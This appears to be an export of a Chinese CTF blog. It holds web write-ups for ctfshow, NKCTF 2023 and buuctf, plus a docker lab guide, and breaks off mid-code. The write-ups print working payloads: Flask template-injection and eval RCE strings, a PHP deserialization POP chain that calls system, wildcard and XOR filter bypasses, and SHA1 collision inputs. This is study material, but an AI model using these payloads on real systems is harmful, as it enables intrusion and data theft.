hellodear(name):\n    if \"ge\" in name:\n        return render_template_string('hello %s' % name)\n    elif \"f\" not in name:\n        return render_template_string('hello %s' % name)\n    else:\n        return 'Nonononon'\n```\n\n一眼顶针，flask的模板注入\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680680541981-d158f0ea-eb91-455f-96f7-e07327426721.png)\n\n然后网上payoad太多了（https://blog.csdn.net/qq_46918279/article/details/121270806）\n\n这里主要过滤了斜杠，可以用`${HOME:0:1}`绕过\n\npayload: \n\n`{{get_flashed_messages.__globals__['os'].popen('whoami').read()}}`\n\n`{{().__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__['popen']('cat ${HOME:0:1}[e-g]lag').read()}}` \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680680569196-d457fb09-796e-4298-a9cc-6d686b500d42.png)\n\n# challenge_4 easy_flask\n\n这道题目快做出来了，最后一步没有去读取当前目录下的app.py的文件去看源码，真给自己无语住了，脑子被大便灌了一样\n\n回到题目：\n\n看标题还是关于flask模板的漏洞\n\n申请一个账号进去\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680681197676-57ac85a1-3064-41a1-83d0-732cb4a05b0d.png)\n\n最后一句话他说只会给admin给一些东西，那么目标就很明确了，flask模板常见的session伪造，找一个脚本伪造就行了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680681282376-730ae4d5-a1ae-4d8f-a582-40b6713c5101.png)\n\n之后给到一个假的flag 然后注意到他请求方式\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680681334740-bdbc1132-befd-4deb-b14f-7f1c618c8af1.png)\n\n他现在给的源代码只是一部分，我们应该通过读app.py来获取完整的源代码\n\n```php\n# app.py\nfrom flask import Flask, render_template, request, redirect, url_for, session, send_file, Response\n\n\napp = Flask(__name__)\n\n\napp.secret_key = 'S3cr3tK3y'\n\nusers = {\n    'admin': {'password': 'LKHSADSFHLA;KHLK;FSDHLK;ASFD', 'role': 'admin'}\n}\n\n\n\n@app.route('/')\ndef index():\n    # Check if user is loggedin\n    if 'loggedin' in session:\n        return redirect(url_for('profile'))\n    return redirect(url_for('login'))\n\n@app.route('/login/', methods=['GET', 'POST'])\ndef login():\n    msg = ''\n    if request.method == 'POST' and 'username' in request.form and 'password' in request.form:\n        username = request.form['username']\n        password = request.form['password']\n        if username in users and password == users[username]['password']:\n            session['loggedin'] = True\n            session['username'] = username\n            session['role'] = users[username]['role']\n            return redirect(url_for('profile'))\n        else:\n            msg = 'Incorrect username/password!'\n    return render_template('login2.html', msg=msg)\n\n\n@app.route('/register/', methods=['GET', 'POST'])\ndef register():\n    msg = '' \n    if request.method == 'POST' and 'username' in request.form and 'password' in request.form:\n        username = request.form['username']\n        password = request.form['password']\n        if username in users:\n            msg = 'Account already exists!'\n        else:\n            users[username] = {'password': password, 'role': 'user'}\n            msg = 'You have successfully registered!'\n    return render_template('register2.html', msg=msg)\n\n\n\n@app.route('/profile/')\ndef profile():\n    if 'loggedin' in session:\n        return render_template('profile2.html', username=session['username'], role=session['role'])\n    return redirect(url_for('login'))\n\n\n@app.route('/show/')\ndef show():\n    if 'loggedin' in session:\n        return render_template('show2.html')\n\n@app.route('/download/')\ndef download():\n    if 'loggedin' in session:\n        filename = request.args.get('filename')\n        if 'filename' in request.args:              \n            return send_file(filename, as_attachment=True)\n  \n    return redirect(url_for('login'))\n\n\n@app.route('/hello/')\ndef hello_world():\n    try:\n        s = request.args.get('eval')\n        return f\"hello,{eval(s)}\"\n    except Exception as e:\n        print(e)\n        pass\n        \n    return \"hello\"\n    \n\n\n@app.route('/logout/')\ndef logout():\n   session.pop('loggedin', None)\n   session.pop('id', None)\n   session.pop('username', None)\n   session.pop('role', None)\n   return redirect(url_for('login'))\n\n\nif __name__ == \"__main__\":\n    app.run(host='0.0.0.0', port=8080)\n```\n\n注意到这里 可以进行命令执行 注意是python的命令执行和php的形式稍有不同\n\n```php\n@app.route('/hello/')\ndef hello_world():\n    try:\n        s = request.args.get('eval')\n        return f\"hello,{eval(s)}\"\n    except Exception as e:\n        print(e)\n        pass\n        \n    return \"hello\"\n/hello/?eval=__import__('os').popen('ls /').read()\n/hello/?eval=__import__('os').popen('cat /flag_is_h3re').read()\n```\n\n稍微解释一下 还是不太熟悉python的命令执行 是通过调用模块的方式\n\n**__import__()** 函数用于动态加载类和函数  \n\n**os** --- 操作系统接口模块\n\n**os.popen()** 方法用于从一个命令打开一个管道。  \n\n**read()** 方法用于从文件读取指定的字节数，如果未给定或为负则读取所有。  \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680681711491-461b37da-6ce3-4b0d-9b1b-f5be01576642.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680681726881-b115297a-f1d5-4d07-9666-f4f38e5cf138.png)\n\n# Challenge_5 easy_php\n\n源码：\n\n```php\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n\nclass ctfshow{\n\n    public function __wakeup(){\n        die(\"not allowed!\");\n    }\n\n    public function __destruct(){\n        system($this->ctfshow);\n    }\n\n}\n\n$data = $_GET['1+1>2'];\n\nif(!preg_match(\"/^[Oa]:[\\d]+/i\", $data)){\n    unserialize($data);\n}\n\n\n?>\n```\n\n这道题不会做，看了wp还是蛮神奇的，简单分析一下\n\n应该是通过反序列化去执行ctfshow类中的`system()`函数\n\n这里首先解除一下我固有的想法，我们都知道，当反序列化时首先会执行__wakeup魔术方法，这道题执行后会用到die()函数，程序运行完了，我原以为要通过增加对象属性方法去绕过__wakeup函数，但是发现没必要，因为析构函数不会受到影响。\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680682560289-777732f6-fecf-4574-9c71-9b1cac882a4b.png)\n\n所以没必要去绕过\n\n那么这道题目最主要的就是去绕过这个正则匹配\n\n```php\nif(!preg_match(\"/^[Oa]:[\\d]+/i\", $data)){\n    unserialize($data);\n}\n```\n\n我们传参不能以O或者a开头\n\n我们都知道序列化后的字符串首字母就为O 意为object对象的意思\n\n那么这里应该怎么绕过呢\n\n这里考到了 PHP7.3 __wakeup绕过，ArrayObject内置类 并且这个类可以起到类似于反序列化我们传入的序列化对象，当然这里说的不严谨，但可以这样理解参考：https://juejin.cn/post/7105704360155283469 \n\n注意这里只能在php7.3版本下才能成功，一开始复现的时候没注意到\n\n ![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680683801763-77de8014-f72c-4c36-8e8e-b8016b18d2c3.png)\n\nc打头\n\n那么问题来了，为什么要ban a字符呢ban了o字符不久行了嘛\n\n如果不ban a 我们可以直接序列化数组去包含我们的恶意代码从而达到getshell\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680684039061-77ce25bf-492d-4fea-ab53-dc14a69e04c2.png)\n\n明白之后，本地构造\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680684422756-3957d554-5eb3-4b5a-b998-426f46960407.png)\n\n这里传参的时候记得把1+1>2 url编码一下\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680684325551-252a9b8d-ed0a-4898-9ddb-f3983e2a9f6e.png)\n\n之后就是读取了。\n\n# 后记：\n\n这次最主要学到了php原生类的知识点把，tql！！！！\n\n","tags":["php原生类","flask session伪造","ssti"],"categories":["ctfshow"]},{"title":"记一次简单的docker开设web靶场","url":"/post/5400d97d.html","content":"\n记录一次简单的docker开设web靶场\n\n<!--more-->\n\n# 前期准备：\n\n一台云服务器(这里用到了舍友的服务器==)\n\ndocker环境\n\n# 正文：\n\n首先自我认识什么是docker，docker就像是一个装水的杯子，在这里把里面的水叫做镜像，我们需要先下载好镜像，当运行镜像时，docker会先在本地寻找所要打开的镜像，如果找不到就会自动从docker镜像仓库下载。\n\n这里我已经提前配置好了docker环境 上网一搜有很多安装教程\n\n`docker version`查看版本信息\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680239557401-3f605a8c-793d-4257-a9f8-8db90a07ff2f.png)\n\n`docker search lamp` 查找lamp堆栈镜像\n\nLAMP 堆栈是开发人员用来构建网站和 Web 应用程序的四种不同软件技术的捆绑包。\n\nLAMP 是操作系统 Linux、Web 服务器 Apache、数据库服务器 MySQL 和编程语言 PHP 的首字母缩写  \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680244378603-6e7e24e9-493e-4cb9-8dcd-89dcc1780d88.png)\n\n`docker pull  tutum/lamp`  下载tutum/lamp版本的 \n\n`docker iamges` 下载好之后查看本地镜像\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680244467495-06625797-38d0-4cbc-b25c-96cc941260bf.png)\n\n将镜像实例化 需要分配服务器的端口 这里要在服务器管理页面给开放一个端口（比如阿里云或者腾讯云的控制台）\n\n` docker run -d -p 9999:80 tutum/lamp  `这里我分配的是9999端口\n\n`docker ps`查看当前运行的容器，看到了我们刚刚启动的容器\n\n`docker ps -a`是查看所有的容器，包括当前不运行的\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680245286556-0ba73951-dc0a-4cfb-84ff-670601a7ca8c.png)\n\n这里注意一下，区分镜像和容器的区别，一个镜像可以开很多个容器，用容器id来区分相同镜像实例化产生不同的容器，这里还是要注意记录一下自己在用的容器id，以免误删了，整个容器中的你已经弄好的文件都会被删除。\n\n`docker exec -it 1c0d6146aa65 bash` 进入我们刚刚实例化好的容器里面\n\n`exit`退出当前所在的容器\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680245570215-8d68ad83-e2c9-4028-b1a2-b17b84d337d0.png)\n\n接下来就是在/var/www/html文件下的index.php下提交web题目的源码，然后在根目录下创建flag的文件，一个简单的web靶场复现环境就创建好了，接下来就可以愉快的复现题目了！\n\n这里我放了一个测试php代码和根目录下的flag文件：\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680246463698-c3ceb1ae-e186-4943-a0af-ad5173eba16a.png)\n\n还有就是这个lamp开的容器内是没有vim编辑环境的，如果直接想在容器内写代码的话，可以在容器内安装vim编辑器。\n\n浏览器访问：`124.221.177.174:9999`\n\n成功一个简单的web靶场就搭建好了！\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680246392826-a865a0c6-42cc-4105-bcc0-b5dd202c356e.png)\n\n如果想关闭容器，注意这里不是删除镜像文件，只是关闭这个镜像实例化的一个容器。\n\n`docker stop 容器id`关闭容器\n\n`docker start 容器id`打开容器\n\n`docker rm 容器id` 删除容器 \n\n# 结尾：\n\n这里步骤截图放的图片暴露了服务器的外网ip和一些其他信息，大佬不要渗透我啊，这里只是一个热爱ctf的小菜鸡的一次记录罢了，在线求饶QWQ\n","tags":["搭建","docker"],"categories":["搭建"]},{"title":"NKCTF 2023 WEB WP","url":"/post/8bc42760.html","content":"\nNKCTF 2023 部分WEB WP\n\n<!--more-->\n\n# 前言\n\n这次第一次组队，与舍友一位pwn选手(攻克三道)，打还是蛮不错的一次体验，虽然排名没有多靠前吧，坐牢两天终于啃下两道web题目，听说其他都是1day，还是大佬的比赛啊，我这种菜狗就啃啃签到题目，但收获还是很多啊。\n\n最后只攻克了三道，也写写wp吧，也算是给自己记录一下。\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679928004403-8a6fdc30-ca46-4faf-bb59-ba788d93bf12.png)\n\n# baby_php\n\n放出源码：\n\n```plain\n<?php\n    error_reporting(0);\n    class Welcome{\n        public $name;\n        public $arg = 'oww!man!!';\n        public function __construct(){\n            $this->name = 'ItS SO CREAZY';\n        }\n        public function __destruct(){\n            if($this->name == 'welcome_to_NKCTF'){\n                echo $this->arg;\n            }\n        }\n    }\n\n    function waf($string){\n        if(preg_match('/f|l|a|g|\\*|\\?/i', $string)){\n            die(\"you are bad\");\n        }\n    }\n    class Happy{\n        public $shell;\n        public $cmd;\n        public function __invoke(){\n            $shell = $this->shell;\n            $cmd = $this->cmd;\n            waf($cmd);\n            eval($shell($cmd));\n        }\n    }\n    class Hell0{\n        public $func;\n        public function __toString(){\n            $function = $this->func;\n            $function();\n        }\n    }\n\n    if(isset($_GET['p'])){\n        unserialize($_GET['p']);\n    }else{\n        highlight_file(__FILE__);\n    }\n?>\n```\n\n一道经典的反序列化pop链rce题目，就是我卡在最后怎么绕waf很久，我太菜了。\n\npop链构造很简单，主要说说waf的绕过把\n\nwaf分别禁了f l a g 字符这就导致很多linux命令都不能用了 比如ls cat tac less tail \n\n然后还禁了通配符`?` 和`*`防止我们通过这样模糊操作去getshell  \n\nls 可以通过 dir来绕过  读文件用more来绕过\n\n然后读flag就是很头疼的事情了，这里就是因为他禁了通配符给了我启发\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679891817693-acfb04f2-5a0e-4435-97f9-fdba062697b5.png)\n\n参考：https://abcfy2.gitbooks.io/linux_basic/content/first_sense_for_linux/command_learning/wildcard.html\n\n还有一种通配符是`[]`可以匹配指定范围中的任意字符 那么 f和g就可以用`[e-h]`来绕过\n\na是字母表第一个，该怎么绕过呢，我们可以构造`[非数字]`形式:`[^0-9]` 这里尖括号就是排除匹配范围，这也就可以包含所有字母 来达到获取a的效果了\n\n本地构造：\n\n```plain\n<?php\n    error_reporting(0);\n    class Welcome{\n        public $name;\n        public $arg = 'oww!man!!';\n        public function __construct(){\n            $this->name = 'welcome_to_NKCTF';\n        }\n    }\n\n    class Happy{\n        public $shell;\n        public $cmd;\n    }\n    class Hell0{\n        public $func;\n    }\n$a=new Welcome();\n$a->arg = new Hell0();\n$a->arg->func = new Happy();\n$a->arg->func->shell='system';    \n$a->arg->func->cmd=\"more  /[e-h]1[^0-9][e-h]\";\necho urlencode(serialize($a));\n?>\n```\n\n记得最后payload url编码一下 反序列化题目的常用套路了\n\n```\np=O%3A7%3A%22Welcome%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A16%3A%22welcome_to_NKCTF%22%3Bs%3A3%3A%22arg%22%3BO%3A5%3A%22Hell0%22%3A1%3A%7Bs%3A4%3A%22func%22%3BO%3A5%3A%22Happy%22%3A2%3A%7Bs%3A5%3A%22shell%22%3Bs%3A6%3A%22system%22%3Bs%3A3%3A%22cmd%22%3Bs%3A24%3A%22more++%2F%5Be-h%5D1%5B%5E0-9%5D%5Be-h%5D%22%3B%7D%7D%7D\n```\n\n拿到flag\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679892001266-d44e146e-ab39-40b0-98f5-4f46ab72ee96.png)\n\n# esay_php\n\n放出源码：\n\n```plain\n<?php \n    highlight_file(__FILE__);\n    error_reporting(0);\n    if($_GET['a'] != $_GET['b'] && md5($_GET['a']) == md5($_GET['b'])){\n        if((string)$_POST['c'] != (string)$_POST['d'] && sha1($_POST['c']) === sha1($_POST['d'])){\n            if($_GET['e'] != 114514 && intval($_GET['e']) == 114514){\n                if(isset($_GET['NS_CTF.go'])){\n                    if(isset($_POST['cmd'])){\n                        if(!preg_match('/[0-9a-zA-Z]/i', $_POST['cmd'])){\n                            eval($_POST['cmd']);\n                        }else{\n                            die('error!!!!!!');\n                        }\n                    }else{\n                        die('error!!!!!');\n                    }\n                }else{\n                    die('error!!!!');\n                }\n            }else{\n                die('error!!!');\n            }\n        }else{\n            die('error!!');\n        }\n    }else{\n        die('error!');\n    }\n?>\n```\n\n这是一道md5弱相等，sha1碰撞，php字符串解析特性这里是考php命名规则合法与否，还有就是无数字字母rce。\n\n## sha1碰撞\n\n来看sha1碰撞：\n\n之前有做过md5强相等的题目，因为被string强转化了，所以一些常见的数组绕过就不能用了，只能老实用脚本碰撞，sha1和md5做法很相似。\n\nsha1 — 计算字符串的 sha1 散列值\n\n在这里先说一说md5强类型字符串转换后碰撞相等吧\n\n这里有专门md5碰撞的脚本：https://blog.csdn.net/shuaicenglou3032/article/details/118197904 \n\n本地测试\n\n先拿到散列值：\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679926136860-9c662264-fd6e-411f-9074-2a2201872239.png)\n\n本地写一个测试demo\n\n源码：\n\n```php\n<?php \nshow_source('index.php');\n$a=$_GET['a'];\n$b=$_GET['b'];\nif((string)$a != (string)$b && md5($a) === md5($b)){\n    echo \"yes\";\n}\nelse{\n    echo \"no\";\n}\n?>\n```\n\n这里测试最好在低版本php下测试不然高版本已经被修复了 我这里version是5.3.29\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679926309291-918ee00d-2b44-43fc-8424-04f9c2d48c25.png)\n\n测试是可以通过脚本碰撞\n\n再来看sha1()\n\n这里没有找到关于sha1的碰撞脚本，但是找到了两个符合条件的值，之后再遇到拿来用就行。\n\na=`%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1`\n\nb=`%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679926782885-7cec8231-cd06-4dc8-b096-96e3b49887a7.png)\n\n## php命名规则\n\n一开始做的时候以为这道题出问题了，最后发现这里有坑。\n\n先来看本地测试，如果我们直接给NS_CTF.go传值，传入后会是什么呢？\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679927046246-3e3675f4-af68-4d8e-9be3-1c63a5ebffff.png)\n\n可见当我们传入的点号被改为了下划线，这里是因为点号在php内是非法命名符，会被转化为下划线\n\n官方文档中有提到：https://www.php.net/manual/zh/language.variables.external.php\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679927257277-ddeecad1-21b1-4a85-be39-e28b4bd87882.png)\n\n那么该怎么绕过呢 这里参考：https://xz.aliyun.com/t/11512\n\n构造payload: `NS[CTF.go=1`就能绕过 \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679927514308-229d457c-463c-44b8-ab89-bda1cb695b70.png)\n\n这里会把第一个`[`先转化为下划线然后第二个点就不会被转化了\n\n这里我认为是php解析时把第一个`[`当作了数组的标志但不合法就给转化了 然后以为点是数组里的元素名从而没有转化为下划线\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679927469133-3fe86fe3-7032-474b-9f2b-458df0d365ef.png)\n\n这个bug只有当php版本小于8时才会有：参考：https://blog.csdn.net/mochu7777777/article/details/115050295\n\nphp8版本修复了这个bug，如图\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679979254109-272268cf-7aef-41f0-af9c-6a23471c0c42.png)\n\n\n\n## 无数字字母rce\n\n这里用到了异或绕过，直接脚本生成，真的很方便 放大佬的理解：https://xz.aliyun.com/t/11929#toc-4 \n\n总结的非常好透彻，我就不在这里多言了qwq\n\n放一下构造脚本把：\n\n```python\nimport re\nimport requests\nimport urllib\nfrom sys import *\nimport os\n\n\na=[]\nans1=\"\" \nans2=\"\"\nfor i in range(0,256): #设置i的范围\n    c=chr(i)\n    #将i转换成ascii对应的字符，并赋值给c\n    tmp = re.match(r'[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\&|\\-',c,re.I)\n    #设置过滤条件，让变量c在其中找对应，并利用修饰符过滤大小写，这样可以得到未被过滤的字符\n    if(tmp):\n        continue\n        #当执行正确时，那说明这些是被过滤掉的，所以才会被匹配到，此时我们让他继续执行即可\n    else:\n        a.append(i)\n        #在数组中增加i，这些就是未被系统过滤掉的字符\n\n\n# eval(\"echo($c);\");\nmya=\"system\"  #函数名 这里修改！\nmyb=\"dir\"      #参数\ndef myfun(k,my): #自定义函数\n    global ans1 #引用全局变量ans1，使得在局部对其进行更改时不会报错\n    global ans2 #引用全局变量ans2，使得在局部对其进行更改时不会报错\n    for i in range (0,len(a)): #设置循环范围为（0，a）注：a为未被过滤的字符数量 \n        for j in range(i,len(a)): #在上个循环的条件下设置j的范围\n            if(a[i]^a[j]==ord(my[k])):\n                ans1+=chr(a[i]) #ans1=ans1+chr(a[i])\n                ans2+=chr(a[j]) #ans2=ans2+chr(a[j])\n                return;#返回循环语句中，重新寻找第二个k，这里的话就是寻找y对应的两个字符\nfor x in range(0,len(mya)): #设置k的范围\n    myfun(x,mya)#引用自定义的函数\ndata1=\"('\"+urllib.request.quote(ans1)+\"'^'\"+urllib.request.quote(ans2)+\"')\" #data1等于传入的命令,\"+ans1+\"是固定格式，这样可以得到变量对应的值，再用'包裹，这样是变量的固定格式，另一个也是如此，两个在进行URL编码后进行按位与运算，然后得到对应值\nprint(data1)\nans1=\"\"#对ans1进行重新赋值\nans2=\"\"#对ans2进行重新赋值\nfor k in range(0,len(myb)):#设置k的范围为(0,len(myb))\n    myfun(k,myb)#再次引用自定义函数\ndata2=\"(\\\"\"+urllib.request.quote(ans1)+\"\\\"^\\\"\"+urllib.request.quote(ans2)+\"\\\")\"\nprint(data2)\n```\n","tags":["RCE奇淫方式","PHP反序列化","linux通配符","getshell","md5 sha1强相等"],"categories":["NKCTF2023"]},{"title":"buuctf 38-[GXYCTF2019]禁止套娃","url":"/post/2ed7a105.html","content":"\nbuuctf 38-[GXYCTF2019]禁止套娃\n\n<!--more-->\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082337192.png)\n\n\n\n开局一张图，buu网站扫网站有时候出不来，看了别人的wp是git源码泄露了 参考大佬的文章：https://www.freebuf.com/articles/web/346607.html \n\n可以拿config文件测试一下\n\n构造payload：`http://9ec6b0e9-a2e5-4d60-b33a-22ff1c436245.node4.buuoj.cn:81/.git.config` \n\n • **config：**文件包含项目特有的配置选项，git config命令会改动它；  \n\n发现有文件下载下来 说明是github源码泄露\n\n下好脚本 构造payload：`python2 GitHack.py http://9ec6b0e9-a2e5-4d60-b33a-22ff1c436245.node4.buuoj.cn:81/.git` 注意末尾加上 `.git` ![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082337237.png)\n\n查看index.php \n\n```php\n<?php\ninclude \"flag.php\";\necho \"flag在哪里呢？<br>\";\nif(isset($_GET['exp'])){\n    if (!preg_match('/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i', $_GET['exp'])) {\n        if(';' === preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['exp'])) {\n            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {\n                // echo $_GET['exp'];\n                @eval($_GET['exp']);\n            }\n            else{\n                die(\"还差一点哦！\");\n            }\n        }\n        else{\n            die(\"再好好想想！\");\n        }\n    }\n    else{\n        die(\"还想读flag，臭弟弟！\");\n    }\n}\n// highlight_file(__FILE__);\n?>\n```\n\n主要是过滤了一些伪协议和一些`“et”“na”“info”“dec”“bin”“hex”“oct”“pi”“log”`字符\n\n最重要的是中间一层 有我不知道的正则表达式的知识点 参考：https://blog.csdn.net/Manuffer/article/details/120738755\n\n```\nif(';' === preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['exp']))\n```\n\n这里`(?R)`代表当前表达式 ,就是这个`(/[a-z,_]+((?R)?)/)`，所以会一直递归，?表示递归当前表达式0次或1次（若是(?R)*则表示递归当前表达式0次或多次，例如它可以匹配`a(b(c(d())))` 注意这里加号不是把前后连接起来 +：加号在正则表达式有特殊含义，等同于匹配前面的子表达式一次或多次\n\n当`;`等于后面匹配完以后剩余的`;`条件成立  可以根据这个思路构造命令执行\n\n### 方法一：\n\nlocaleconv() 函数返回一包含本地数字及货币格式信息的数组。\n\n(PHP 4, PHP 5, PHP 7, PHP 8)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082337225.png)\n\n返回一个数组 第一个元素为`.` 构造payload的时候可以用的 `.` 和 `./` 意思相同都是当前目录 `../`是上级目录 \n\ncurrent() — 返回数组中的当前值\n\n说明:\n\ncurrent(array|object $array): mixed\n\n每个数组中都有一个内部的指针指向它“当前的”单元，初始化时会指向该数组中的第一个值。\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082337217.png)\n\n构造`?exp=print_r(scandir(current(localeconv())));`\n\n所以这个组合scandir(current(localeconv()))很常用，可以记一下。\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082337258.png)\n\n发现flag文件，接下来就是怎么读了，因为现在指针指在第一个元素上 把数组反转过来让flag文件在正数第二 再通过next()指向第二个元素读取flag\n\narray_reverse() — 返回单元顺序相反的数组\n\nnext() — 将数组中的内部指针向前移动一位\n\nshow_source — 别名 highlight_file() 用哪个都行\n\n构造payload:`?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082337248.png)\n\n### 方法二：\n\n通过修改phpsession即会话状态 然后payload读出来即可 参考还是上面的文章 https://blog.csdn.net/Manuffer/article/details/120738755\n\nsession_id()可以用来获取/设置当前会话 ID,可以用这个函数来获取cookie中的`phpsessionid`了，并且这个值我们是可控的。\n\n但session_id必须要开启session才可以使用，所以我们要先使用session_start。\n\n构造payload:`?exp=show_source(session_id(session_start()));`\n\nbp抓包修改`session_id=flag.php`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082337617.png)\n","tags":["源码泄露","GitHack","(?R)","嵌套构造","PHPSESSION"]},{"title":"buuctf 37-[网鼎杯 2020 朱雀组]phpweb","url":"/post/6d6051d0.html","content":"\nbuuctf [网鼎杯 2020 朱雀组]phpweb\n\n<!--more-->\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082340646.png)\n\n发现可以直接获取我们的时间，并且每五分钟刷新更新一次，大致意思就是利用系统时区设置，最重要的是应该是这个网页通过php 里的data()函数来获取当前我们的时间，并且在网页源代码中也标出来了，应该算是提示。\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082340325.png)\n\n并且发现 通过post方式 给`$func`传值为 `data`    `$p` 传值为`Y-m-d h:i:s a` data()函数格式化时间用的\n\n所以就可以 用system() 函数命令执行了 但是肯定不行 被河蟹了 \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082340430.png)\n\n发现随便输入时 会爆出call_user_func()函数 这个函数简单来说就是用第一个输入值作为回调函数 第二个输入为第一个回调函数的参数 \n\n直接使用file_get_contents() 本来想直接爆出flag文件的内容 但是命名被改为别的形式了 呢就爆一下index.php看一下黑名单\n\n```plain\n<?php\n    $disable_fun = array(\"exec\",\"shell_exec\",\"system\",\"passthru\",\"proc_open\",\"show_source\",\"phpinfo\",\"popen\",\"dl\",\"eval\",\"proc_terminate\",\"touch\",\"escapeshellcmd\",\"escapeshellarg\",\"assert\",\"substr_replace\",\"call_user_func_array\",\"call_user_func\",\"array_filter\", \"array_walk\",  \"array_map\",\"registregister_shutdown_function\",\"register_tick_function\",\"filter_var\", \"filter_var_array\", \"uasort\", \"uksort\", \"array_reduce\",\"array_walk\", \"array_walk_recursive\",\"pcntl_exec\",\"fopen\",\"fwrite\",\"file_put_contents\");\n    function gettime($func, $p) {\n        $result = call_user_func($func, $p);\n        $a= gettype($result);\n        if ($a == \"string\") {\n            return $result;\n        } else {return \"\";}\n    }\n    class Test {\n        var $p = \"Y-m-d h:i:s a\";\n        var $func = \"date\";\n        function __destruct() {\n            if ($this->func != \"\") {\n                echo gettime($this->func, 